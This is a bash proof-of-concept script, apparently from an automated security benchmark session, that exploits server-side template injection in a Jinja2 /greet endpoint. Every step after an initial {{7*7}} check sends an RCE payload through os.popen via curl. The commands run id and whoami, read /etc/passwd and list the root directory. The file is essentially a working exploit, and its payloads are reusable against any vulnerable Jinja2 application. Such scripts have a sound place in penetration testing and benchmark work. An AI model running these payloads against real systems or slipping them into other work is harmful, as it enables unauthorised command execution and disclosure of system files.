#!/bin/bash
# POC: Server-Side Template Injection (SSTI) in /greet endpoint demonstrating Remote Code Execution via Jinja2 template expression injection
# Target: ./repo
# Created: 2025-11-07T21:35:34.266Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# Server-Side Template Injection (SSTI) RCE POC
# Target: /greet endpoint with 'name' parameter
# Vulnerability: Jinja2 template injection leading to RCE

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/greet"

echo "[*] SSTI RCE Proof-of-Concept"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic expression evaluation (7*7 = 49)
echo "[TEST 1] Basic Expression Evaluation: {{7*7}}"
PAYLOAD='{{7*7}}'
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${PAYLOAD}")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "49"; then
    echo "[✓] Expression evaluation confirmed - template injection possible"
else
    echo "[✗] Expression evaluation failed"
fi
echo ""

# Test 2: Command execution - id command
echo "[TEST 2] Command Execution: id"
PAYLOAD='{{cycler.__init__.__globals__.os.popen("id").read()}}'
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${PAYLOAD}")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "uid="; then
    echo "[✓] Command execution confirmed - RCE achieved"
    UID=$(echo "$RESPONSE" | grep -oP 'uid=\d+\([^)]+\)')
    echo "[✓] Current user: $UID"
else
    echo "[✗] Command execution failed"
fi
echo ""

# Test 3: Command execution - whoami
echo "[TEST 3] Command Execution: whoami"
PAYLOAD='{{cycler.__init__.__globals__.os.popen("whoami").read()}}'
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${PAYLOAD}")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "daytona\|root"; then
    echo "[✓] Whoami execution confirmed"
else
    echo "[✗] Whoami execution failed"
fi
echo ""

# Test 4: File read - /etc/passwd
echo "[TEST 4] File Read: /etc/passwd"
PAYLOAD='{{cycler.__init__.__globals__.os.popen("cat /etc/passwd").read()}}'
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${PAYLOAD}")
echo "Response (first 200 chars): ${RESPONSE:0:200}..."
if echo "$RESPONSE" | grep -q "root:"; then
    echo "[✓] File read confirmed - sensitive files accessible"
else
    echo "[✗] File read failed"
fi
echo ""

# Test 5: Directory listing
echo "[TEST 5] Directory Listing: ls -la /"
PAYLOAD='{{cycler.__init__.__globals__.os.popen("ls -la /").read()}}'
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?name=${PAYLOAD}")
echo "Response (first 200 chars): ${RESPONSE:0:200}..."
if echo "$RESPONSE" | grep -q "total\|bin\|etc"; then
    echo "[✓] Directory listing confirmed"
else
    echo "[✗] Directory listing failed"
fi
echo ""

echo "[*] SSTI RCE POC Complete"